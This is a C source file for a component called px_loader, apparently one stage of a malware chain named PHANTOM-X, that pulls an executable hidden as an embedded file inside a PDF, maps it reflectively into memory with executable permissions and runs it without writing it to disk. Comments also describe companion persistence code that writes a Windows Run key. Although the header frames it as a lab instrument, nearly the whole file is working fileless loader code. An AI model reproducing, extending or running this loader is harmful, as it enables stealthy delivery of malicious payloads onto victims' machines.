/*
 * PHANTOM-X :: phase3_fileless/loader/px_loader.c
 * =============================================================================
 * px_loader.exe -- PDF embedded-file extractor and reflective PE loader.
 *
 * This is the component that makes the chain fileless. It:
 *   1. Opens a PDF file.
 *   2. Parses the PDF container and locates the /Type /EmbeddedFile stream.
 *   3. Decodes the stream (FlateDecode) in memory.
 *   4. Maps the embedded PE image into memory by hand: headers, sections,
 *      base relocations, import table, TLS callbacks, section protections.
 *   5. Calls the PE entry point on a new thread.
 *
 * The embedded PE is never written to disk. Nothing lands in the filesystem.
 *
 * SCOPE AND DELIBERATE OMISSIONS
 *   A laboratory instrument for a personally owned, isolated Windows VM.
 *   Deliberately PLAIN: no obfuscation, no packing, no AMSI bypass, no
 *   ETW unhooking, no process-hollowing evasion, no anti-analysis. The
 *   loader is written to be READABLE, because the research value is in
 *   demonstrating and measuring the technique, not in hiding it.
 *
 *   It does not touch processes it did not start. It maps the payload into
 *   its own process space.
 *
 * BUILD (MinGW, x64):
 *   x86_64-w64-mingw32-gcc -O2 -Wall -o px_loader.exe px_loader.c \
 *       -lz -lws2_32
 *
 * BUILD (MinGW, x86):
 *   i686-w64-mingw32-gcc -O2 -Wall -o px_loader.exe px_loader.c \
 *       -lz -lws2_32
 *
 * BUILD (MSVC, x64):
 *   cl /nologo /O2 /W4 px_loader.c /link ws2_32.lib
 *   (MSVC has zlib via vcpkg; otherwise drop the FlateDecode path and
 *    store the embedded file uncompressed.)
 *
 * USAGE
 *   px_loader.exe <document.pdf> [marker.txt]
 */

#define _WIN32_WINNT 0x0601
#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <ctype.h>
#include <zlib.h>

/* ================================================================== */
/* logging                                                            */
/* ================================================================== */
static FILE *g_log = NULL;

static void px_log(const char *fmt, ...)
{
    va_list ap;
    va_start(ap, fmt);
    vprintf(fmt, ap);
    va_end(ap);
    if (g_log) {
        va_start(ap, fmt);
        vfprintf(g_log, fmt, ap);
        va_end(ap);
        fflush(g_log);
    }
}

static void px_log_open(const char *path)
{
    if (!path)
        return;
    g_log = fopen(path, "a");
    if (g_log) {
        fprintf(g_log, "\n=== px_loader run %s ===\n",
                "see process start time");
    }
}

/* ================================================================== */
/* file helpers                                                       */
/* ================================================================== */
static BYTE *read_file(const char *path, size_t *out_len)
{
    FILE *f = fopen(path, "rb");
    BYTE *buf;
    long sz;

    if (!f)
        return NULL;
    fseek(f, 0, SEEK_END);
    sz = ftell(f);
    fseek(f, 0, SEEK_SET);
    if (sz <= 0) {
        fclose(f);
        return NULL;
    }
    buf = (BYTE *)malloc((size_t)sz);
    if (!buf) {
        fclose(f);
        return NULL;
    }
    if (fread(buf, 1, (size_t)sz, f) != (size_t)sz) {
        free(buf);
        fclose(f);
        return NULL;
    }
    fclose(f);
    *out_len = (size_t)sz;
    return buf;
}

/* memmem is a GNU extension; provide a portable equivalent. */
static const BYTE *px_memmem(const BYTE *hay, size_t hay_len,
                             const void *needle, size_t nlen)
{
    if (!nlen || hay_len < nlen)
        return NULL;
    for (size_t i = 0; i + nlen <= hay_len; i++) {
        if (hay[i] == ((const BYTE *)needle)[0] &&
            memcmp(hay + i, needle, nlen) == 0)
            return hay + i;
    }
    return NULL;
}

/* Find the ASCII token in a bounded buffer. */
static long find_token(const BYTE *hay, size_t hay_len, const char *needle,
                       size_t from)
{
    size_t nlen = strlen(needle);
    if (nlen == 0 || hay_len < nlen)
        return -1;
    for (size_t i = from; i + nlen <= hay_len; i++) {
        if (hay[i] == (BYTE)needle[0] && memcmp(hay + i, needle, nlen) == 0)
            return (long)i;
    }
    return -1;
}

/* ================================================================== */
/* PDF embedded file extraction                                       */
/* ================================================================== */
/*
 * Locate the start of the dictionary that encloses the "stream" keyword.
 *
 * Walking backwards, the first ">>" encountered is the close of the
 * enclosing dictionary. Nested dictionaries (a /Params << ... >> block, for
 * example) contribute their own close/open pairs, so a depth counter is
 * required: the matching open is the one that balances the FIRST close seen.
 */
static long dict_start_for_stream(const BYTE *pdf, size_t len, size_t stream_pos)
{
    long closes = 0;
    size_t i = stream_pos;
    (void)len;

    while (i >= 2) {
        if (pdf[i - 1] == '>' && pdf[i] == '>') {
            closes++;
            i -= 2;
            continue;
        }
        if (pdf[i - 1] == '<' && pdf[i] == '<') {
            if (closes == 0) {
                i -= 2;          /* stray open, keep going */
                continue;
            }
            if (closes == 1)
                return (long)(i - 1);   /* matches the first close */
            closes--;
            i -= 2;
            continue;
        }
        i--;
    }
    return -1;
}

/* Locate the end (exclusive) of the dictionary that starts at dict_start. */
static long dict_end_from_start(const BYTE *pdf, size_t len, size_t dict_start)
{
    long depth = 0;
    size_t i = dict_start;

    while (i + 1 < len) {
        if (pdf[i] == '<' && pdf[i + 1] == '<') {
            depth++;
            i += 2;
            continue;
        }
        if (pdf[i] == '>' && pdf[i + 1] == '>') {
            depth--;
            i += 2;
            if (depth == 0)
                return (long)i;
            continue;
        }
        i++;
    }
    return -1;
}

/* Resolve "/Length <int>" or "/Length <num> <gen> R" from a dict text. */
static long dict_length_value(const BYTE *pdf, size_t pdf_len,
                               const BYTE *dict, size_t dict_len,
                               int depth)
{
    static const char key[] = "/Length";
    size_t klen = sizeof(key) - 1;

    for (size_t i = 0; i + klen <= dict_len; i++) {
        if (memcmp(dict + i, key, klen) != 0)
            continue;
        size_t j = i + klen;
        while (j < dict_len && (dict[j] == ' ' || dict[j] == '\r' ||
                                dict[j] == '\n' || dict[j] == '\t'))
            j++;
        if (j >= dict_len || !isdigit((unsigned char)dict[j]))
            continue;
        long first = strtol((const char *)dict + j, NULL, 10);

        /* "N G R" -> indirect reference; resolve inside the owning object */
        size_t k = j;
        while (k < dict_len && isdigit((unsigned char)dict[k]))
            k++;
        while (k < dict_len && (dict[k] == ' ' || dict[k] == '\r' ||
                                dict[k] == '\n' || dict[k] == '\t'))
            k++;
        if (k < dict_len && isdigit((unsigned char)dict[k])) {
            size_t m = k;
            while (m < dict_len && isdigit((unsigned char)dict[m]))
                m++;
            while (m < dict_len && (dict[m] == ' ' || dict[m] == '\r' ||
                                    dict[m] == '\n' || dict[m] == '\t'))
                m++;
            if (m < dict_len && dict[m] == 'R') {
                if (depth > 3)
                    return -1;
                /* find the object body of "<first> 0 obj" ... "endobj" */
                char objpat[64];
                snprintf(objpat, sizeof(objpat), "%ld 0 obj", first);
                long opos = find_token(pdf, pdf_len, objpat, 0);
                if (opos < 0)
                    return -1;
                long eop = find_token(pdf, pdf_len, "endobj", (size_t)opos);
                if (eop < 0)
                    return -1;
                return dict_length_value(pdf, pdf_len, pdf + opos,
                                         (size_t)(eop - opos), depth + 1);
            }
        }
        return first;
    }
    return -1;
}

/* Inflate a zlib stream into a growing buffer. */
static BYTE *inflate_buffer(const BYTE *in, size_t in_len, size_t hint,
                             size_t *out_len)
{
    z_stream zs;
    size_t cap = hint ? hint : (in_len * 4 + 1024);
    BYTE *out;

    if (cap < 4096)
        cap = 4096;
    out = (BYTE *)malloc(cap);
    if (!out)
        return NULL;

    memset(&zs, 0, sizeof(zs));
    if (inflateInit(&zs) != Z_OK) {
        free(out);
        return NULL;
    }
    zs.next_in = (Bytef *)in;
    zs.avail_in = (uInt)in_len;

    for (;;) {
        int rc;
        zs.next_out = out + zs.total_out;
        zs.avail_out = (uInt)(cap - zs.total_out);
        rc = inflate(&zs, Z_NO_FLUSH);
        if (rc == Z_STREAM_END)
            break;
        if (rc != Z_OK && rc != Z_BUF_ERROR) {
            inflateEnd(&zs);
            free(out);
            return NULL;
        }
        if (zs.avail_out == 0) {
            size_t ncap = cap * 2;
            BYTE *nout = (BYTE *)realloc(out, ncap);
            if (!nout) {
                inflateEnd(&zs);
                free(out);
                return NULL;
            }
            out = nout;
            cap = ncap;
        } else if (rc == Z_BUF_ERROR) {
            inflateEnd(&zs);
            free(out);
            return NULL;
        }
    }
    *out_len = zs.total_out;
    inflateEnd(&zs);
    return out;
}

/*
 * Locate and extract the first embedded file.
 * Returns a malloc'd buffer with the DECODED content, or NULL.
 */
static BYTE *extract_embedded_file(const BYTE *pdf, size_t pdf_len,
                                   size_t *out_len, char *name_out,
                                   size_t name_sz)
{
    size_t pos = 0;

    if (name_out && name_sz)
        name_out[0] = '\0';

    while (pos < pdf_len) {
        long sp = find_token(pdf, pdf_len, "stream", pos);
        long ds;
        size_t data_start;
        long length;
        BYTE *raw, *dec;
        size_t raw_len, dec_len = 0;
        int filtered = 0;

        if (sp < 0)
            break;
        ds = dict_start_for_stream(pdf, pdf_len, (size_t)sp);
        if (ds < 0) {
            pos = (size_t)sp + 6;
            continue;
        }

        /* dictionary text bounds */
        long de = dict_end_from_start(pdf, pdf_len, (size_t)ds);
        if (de < 0) {
            pos = (size_t)sp + 6;
            continue;
        }
        size_t dlen = (size_t)de - (size_t)ds;

        /* is this an /EmbeddedFile stream? */
        if (dlen < 14 || px_memmem(pdf + ds, dlen, "/EmbeddedFile", 13) == NULL) {
            pos = (size_t)sp + 6;
            continue;
        }

        /* the embedded file's declared name lives in the Filespec, not here;
         * look for a nearby /F for a nicer log line */
        if (name_out && name_sz && name_out[0] == '\0') {
            const BYTE *fpos = (const BYTE *)px_memmem(pdf, pdf_len, "/F", 2);
            if (fpos) {
                size_t i = (size_t)(fpos - pdf) + 2;
                while (i < pdf_len && (pdf[i] == ' ' || pdf[i] == '\r' ||
                                       pdf[i] == '\n' || pdf[i] == '\t'))
                    i++;
                if (i < pdf_len && pdf[i] == '(') {
                    size_t j = i + 1, k = 0;
                    while (j < pdf_len && pdf[j] != ')' && k < name_sz - 1)
                        name_out[k++] = (char)pdf[j++];
                    name_out[k] = '\0';
                }
            }
        }

        /* data begins after the EOL that follows the "stream" keyword */
        data_start = (size_t)sp + 6;
        if (data_start + 1 < pdf_len && pdf[data_start] == '\r')
            data_start++;
        if (data_start < pdf_len && pdf[data_start] == '\n')
            data_start++;

        length = dict_length_value(pdf, pdf_len, pdf + ds, dlen, 0);
        if (length <= 0 || (size_t)length > pdf_len - data_start) {
            /* fall back to searching for "endstream" */
            long ep = find_token(pdf, pdf_len, "endstream", data_start);
            if (ep < 0)
                break;
            raw_len = (size_t)ep - data_start;
            while (raw_len && (pdf[data_start + raw_len - 1] == '\n' ||
                               pdf[data_start + raw_len - 1] == '\r'))
                raw_len--;
        } else {
            raw_len = (size_t)length;
        }

        raw = (BYTE *)malloc(raw_len ? raw_len : 1);
        if (!raw)
            return NULL;
        memcpy(raw, pdf + data_start, raw_len);

        /* FlateDecode? */
        if (dlen >= 13 && px_memmem(pdf + ds, dlen, "/FlateDecode", 12))
            filtered = 1;

        if (filtered) {
            dec = inflate_buffer(raw, raw_len, raw_len * 3 + 1024, &dec_len);
            free(raw);
            if (!dec)
                return NULL;
        } else {
            dec = raw;
            dec_len = raw_len;
        }

        *out_len = dec_len;
        px_log("[loader] embedded file: %s bytes (encoded %s)\n",
               filtered ? "inflated" : "raw", filtered ? "flate" : "plain");
        if (filtered)
            px_log("[loader]   encoded %lu -> decoded %lu\n",
                   (unsigned long)raw_len, (unsigned long)dec_len);
        return dec;
    }
    return NULL;
}

/* ================================================================== */
/* reflective PE mapping                                              */
/* ================================================================== */
#ifdef _WIN64
typedef IMAGE_THUNK_DATA64 PX_THUNK;
#define PX_ORDINAL64 0x8000000000000000ULL
#else
typedef IMAGE_THUNK_DATA32 PX_THUNK;
#define PX_ORDINAL64 0x80000000U
#endif

static int apply_relocations(BYTE *base, IMAGE_NT_HEADERS *nt, ULONG_PTR delta)
{
    IMAGE_DATA_DIRECTORY *dd =
        &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    IMAGE_BASE_RELOCATION *rel;
    DWORD rva = 0;
    int applied = 0;

    if (!dd->VirtualAddress || !dd->Size || delta == 0)
        return 0;

    rel = (IMAGE_BASE_RELOCATION *)(base + dd->VirtualAddress);
    while (rva < dd->Size) {
        DWORD va = rel->VirtualAddress;
        DWORD size = rel->SizeOfBlock;
        WORD *entries;
        int i;

        if (size < sizeof(IMAGE_BASE_RELOCATION))
            break;
        entries = (WORD *)((BYTE *)rel + sizeof(IMAGE_BASE_RELOCATION));
        for (i = 0; i < (int)((size - sizeof(IMAGE_BASE_RELOCATION)) / 2); i++) {
            WORD e = entries[i];
            WORD type = (WORD)(e >> 12);
            WORD off = (WORD)(e & 0x0FFF);
            if (!off)
                continue;
            if (type == IMAGE_REL_BASED_DIR64) {
                ULONGLONG *p = (ULONGLONG *)(base + va + off);
                *p += delta;
                applied++;
            } else if (type == IMAGE_REL_BASED_HIGHLOW) {
                DWORD *p = (DWORD *)(base + va + off);
                *p += (DWORD)delta;
                applied++;
            }
        }
        rva += size;
        rel = (IMAGE_BASE_RELOCATION *)((BYTE *)rel + size);
    }
    return applied;
}

static int resolve_imports(BYTE *base, IMAGE_NT_HEADERS *nt)
{
    IMAGE_DATA_DIRECTORY *dd =
        &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    IMAGE_IMPORT_DESCRIPTOR *desc;
    int resolved = 0;

    if (!dd->VirtualAddress || !dd->Size)
        return 0;

    desc = (IMAGE_IMPORT_DESCRIPTOR *)(base + dd->VirtualAddress);
    for (; desc->Name; desc++) {
        const char *dllname = (const char *)(base + desc->Name);
        HMODULE hmod = LoadLibraryA(dllname);
        PX_THUNK *thunk;
        PX_THUNK *orig;

        if (!hmod) {
            px_log("[loader]   !! LoadLibrary failed: %s (%lu)\n", dllname,
                   (unsigned long)GetLastError());
            continue;
        }
        thunk = (PX_THUNK *)(base + desc->FirstThunk);
        orig = desc->OriginalFirstThunk
                   ? (PX_THUNK *)(base + desc->OriginalFirstThunk)
                   : thunk;
        for (;;) {
            FARPROC proc;
            if (!orig->u1.Function)
                break;
#ifdef _WIN64
            if (orig->u1.Function & PX_ORDINAL64) {
                proc = GetProcAddress(hmod,
                                      (LPSTR)(orig->u1.Function & 0xFFFF));
            } else {
                IMAGE_IMPORT_BY_NAME *ibn =
                    (IMAGE_IMPORT_BY_NAME *)(base + orig->u1.AddressOfData);
                proc = GetProcAddress(hmod, (LPCSTR)ibn->Name);
            }
            thunk->u1.Function = (ULONGLONG)proc;
#else
            if (orig->u1.Function & PX_ORDINAL64) {
                proc = GetProcAddress(hmod,
                                      (LPSTR)(orig->u1.Function & 0xFFFF));
            } else {
                IMAGE_IMPORT_BY_NAME *ibn =
                    (IMAGE_IMPORT_BY_NAME *)(base + orig->u1.AddressOfData);
                proc = GetProcAddress(hmod, (LPCSTR)ibn->Name);
            }
            thunk->u1.Function = (ULONGLONG)(ULONG_PTR)proc;
#endif
            thunk++;
            orig++;
            resolved++;
        }
    }
    return resolved;
}

static void call_tls_callbacks(BYTE *base, IMAGE_NT_HEADERS *nt)
{
    IMAGE_DATA_DIRECTORY *dd =
        &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
    if (!dd->VirtualAddress || !dd->Size)
        return;
    {
        IMAGE_TLS_DIRECTORY *tls =
            (IMAGE_TLS_DIRECTORY *)(base + dd->VirtualAddress);
        ULONGLONG *arr =
            (ULONGLONG *)(base + tls->AddressOfCallBacks);
        if (!arr)
            return;
        while (*arr) {
            void (*cb)(HMODULE, DWORD, void *) =
                (void (*)(HMODULE, DWORD, void *))(ULONG_PTR)*arr;
            px_log("[loader]   TLS callback @ %p\n", (void *)(ULONG_PTR)*arr);
            cb((HMODULE)base, DLL_PROCESS_ATTACH, NULL);
            arr++;
        }
    }
}

static void dump_region(BYTE *base, size_t size, const char *label)
{
    MEMORY_BASIC_INFORMATION mbi;
    SIZE_T got;

    px_log("[loader] %s region: base=%p size=0x%zx\n", label, (void *)base,
           size);
    got = VirtualQuery(base, &mbi, sizeof(mbi));
    if (got >= sizeof(mbi)) {
        px_log("[loader]   VirtualQuery: base=%p allocbase=%p region=0x%zx "
               "state=0x%lx protect=0x%lx type=0x%lx\n",
               (void *)mbi.BaseAddress, (void *)mbi.AllocationBase,
               (SIZE_T)mbi.RegionSize, (unsigned long)mbi.State,
               (unsigned long)mbi.Protect, (unsigned long)mbi.Type);
    }
}

/*
 * Map a PE image into the current process and return its entry point.
 */
static BYTE *pe_map(BYTE *pe, size_t pe_len, void **entry_out)
{
    IMAGE_DOS_HEADER *dos;
    IMAGE_NT_HEADERS *nt;
    DWORD imageBase, sizeOfImage, sizeOfHeaders;
    BYTE *base;
    IMAGE_SECTION_HEADER *sec;
    WORD i;

    if (pe_len < sizeof(IMAGE_DOS_HEADER)) {
        px_log("[loader] not a PE: too small\n");
        return NULL;
    }
    dos = (IMAGE_DOS_HEADER *)pe;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
        px_log("[loader] not a PE: bad DOS signature 0x%04x\n", dos->e_magic);
        return NULL;
    }
    if ((size_t)dos->e_lfanew + sizeof(IMAGE_NT_HEADERS) > pe_len) {
        px_log("[loader] not a PE: e_lfanew out of range\n");
        return NULL;
    }
    nt = (IMAGE_NT_HEADERS *)(pe + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) {
        px_log("[loader] not a PE: bad NT signature 0x%08x\n", nt->Signature);
        return NULL;
    }

    imageBase = nt->OptionalHeader.ImageBase;
    sizeOfImage = nt->OptionalHeader.SizeOfImage;
    sizeOfHeaders = nt->OptionalHeader.SizeOfHeaders;

    px_log("[loader] PE: machine=0x%04x imagebase=0x%08x sizeofimage=0x%x "
           "entry=0x%x\n",
           nt->FileHeader.Machine, imageBase, sizeOfImage,
           nt->OptionalHeader.AddressOfEntryPoint);

    /* try the preferred base first so relocations are unnecessary */
    base = (BYTE *)VirtualAlloc((LPVOID *)(ULONG_PTR)imageBase, sizeOfImage,
                                MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (base)
        px_log("[loader] mapped at preferred base %p (no relocations needed)\n",
               (void *)base);
    else {
        base = (BYTE *)VirtualAlloc(NULL, sizeOfImage, MEM_RESERVE | MEM_COMMIT,
                                    PAGE_READWRITE);
        px_log("[loader] mapped at arbitrary base %p (relocations required)\n",
               (void *)base);
    }
    if (!base) {
        px_log("[loader] VirtualAlloc failed (%lu)\n",
               (unsigned long)GetLastError());
        return NULL;
    }

    /* headers */
    if (sizeOfHeaders > pe_len)
        sizeOfHeaders = (DWORD)pe_len;
    memcpy(base, pe, sizeOfHeaders);

    /* sections */
    sec = IMAGE_FIRST_SECTION(nt);
    for (i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        DWORD va = sec->VirtualAddress;
        DWORD vsize = sec->Misc.VirtualSize;
        DWORD rawsize = sec->SizeOfRawData;
        DWORD praw = sec->PointerToRawData;

        if (rawsize && praw && (size_t)praw + rawsize <= pe_len) {
            memcpy(base + va, pe + praw, rawsize);
            px_log("[loader]   section %-8s va=0x%05x raw=0x%05x vsize=0x%05x "
                   "chars=0x%08x\n",
                   sec->Name, va, rawsize, vsize, sec->Characteristics);
        }
        if (vsize > rawsize)
            memset(base + va + rawsize, 0, vsize - rawsize);
    }

    /* relocations */
    if ((ULONG_PTR)base != (ULONG_PTR)imageBase) {
        int n = apply_relocations(base, nt,
                                  (ULONG_PTR)base - (ULONG_PTR)imageBase);
        px_log("[loader] applied %d relocation(s)\n", n);
    }

    /* imports */
    {
        int n = resolve_imports(base, nt);
        px_log("[loader] resolved %d import(s)\n", n);
    }

    /* TLS callbacks */
    call_tls_callbacks(base, nt);

    /* final section protections, then flip the whole image to RWX-ish so the
     * entry point can execute regardless of what the sections asked for.
     * NOTE: i must be reset -- the copy loop above left it at
     * NumberOfSections, which silently skipped this loop entirely. */
    sec = IMAGE_FIRST_SECTION(nt);
    for (i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        DWORD prot = PAGE_READWRITE;
        DWORD old = 0;
        if (sec->Characteristics & IMAGE_SCN_MEM_EXECUTE)
            prot = PAGE_EXECUTE_READWRITE;
        if (!VirtualProtect(base + sec->VirtualAddress, sec->Misc.VirtualSize,
                            prot, &old)) {
            px_log("[loader]   VirtualProtect FAILED for section %u (%lu)\n",
                   i, (unsigned long)GetLastError());
        } else {
            px_log("[loader]   protect %-8s va=0x%05x size=0x%05x "
                   "new=0x%lx old=0x%lx\n",
                   sec->Name, sec->VirtualAddress, sec->Misc.VirtualSize,
                   (unsigned long)prot, (unsigned long)old);
        }
    }

    /* the instruction stream was written as data; make it coherent before
     * it is executed */
    FlushInstructionCache(GetCurrentProcess(), base, sizeOfImage);

    {
        MEMORY_BASIC_INFORMATION mbi;
        void *ep = base + nt->OptionalHeader.AddressOfEntryPoint;
        if (VirtualQuery(ep, &mbi, sizeof(mbi)) >= sizeof(mbi)) {
            px_log("[loader] entry page %p protect=0x%lx state=0x%lx\n",
                   (void *)ep, (unsigned long)mbi.Protect,
                   (unsigned long)mbi.State);
        } else {
            px_log("[loader] entry page VirtualQuery failed (%lu)\n",
                   (unsigned long)GetLastError());
        }
    }

    dump_region(base, sizeOfImage, "mapped image");

    *entry_out = base + nt->OptionalHeader.AddressOfEntryPoint;
    px_log("[loader] entry point at %p\n", (void *)*entry_out);
    return base;
}

/* ================================================================== */
/* main                                                               */
/* ================================================================== */
static DWORD WINAPI run_entry(LPVOID p)
{
    int (*fn)(void) = (int (*)(void))p;
    px_log("[loader] calling entry point %p\n", (void *)p);
    fn();
    return 0;
}

int main(int argc, char **argv)
{
    BYTE *pdf, *payload;
    size_t pdf_len = 0, payload_len = 0;
    char name[256] = { 0 };
    void *entry = NULL;
    BYTE *mapped;
    HANDLE th;

    if (argc < 2) {
        printf("usage: px_loader.exe <document.pdf> [logfile]\n");
        return 1;
    }

    px_log_open(argc > 2 ? argv[2] : NULL);

    px_log("[loader] opening %s\n", argv[1]);
    pdf = read_file(argv[1], &pdf_len);
    if (!pdf) {
        px_log("[loader] cannot read %s (%lu)\n", argv[1],
               (unsigned long)GetLastError());
        return 2;
    }
    px_log("[loader] pdf size %lu bytes\n", (unsigned long)pdf_len);

    payload = extract_embedded_file(pdf, pdf_len, &payload_len, name,
                                    sizeof(name));
    free(pdf);
    if (!payload) {
        px_log("[loader] no embedded file found (or it could not be decoded)\n");
        return 3;
    }
    px_log("[loader] extracted '%s' (%lu bytes)\n", name,
           (unsigned long)payload_len);
    px_log("[loader] first bytes:");
    {
        int k;
        for (k = 0; k < 16 && (size_t)k < payload_len; k++)
            px_log(" %02x", payload[k]);
        px_log("\n");
    }

    mapped = pe_map(payload, payload_len, &entry);
    free(payload);
    if (!mapped)
        return 4;

    /* Tell the payload where the document came from.
     *
     * The payload is mapped IN MEMORY, so GetModuleFileName returns
     * the LOADER's path -- it has no image of its own. Anything that
     * needs to name the payload's origin has to be told, and the loader
     * is the only thing that knows.
     *
     * The persistence code uses it to write a Run key that reproduces
     * the session: the loader, with the document as its argument. */
    {
        const char *pdfArg = (argc > 1) ? argv[1] : "";
        if (pdfArg && pdfArg[0]) {
            SetEnvironmentVariableA("PX_CARRIER_PDF", pdfArg);
        } else {
            SetEnvironmentVariableA("PX_CARRIER_PDF", NULL);
        }
    }

    th = CreateThread(NULL, 0, run_entry, entry, 0, NULL);
    if (!th) {
        px_log("[loader] CreateThread failed (%lu)\n",
               (unsigned long)GetLastError());
        return 5;
    }
    px_log("[loader] payload running on thread %lu\n",
           (unsigned long)GetThreadId(th));

    /* the payload owns the session; keep the loader alive so the mapped
     * image stays mapped */
    WaitForSingleObject(th, INFINITE);
    px_log("[loader] payload thread exited\n");
    return 0;
}
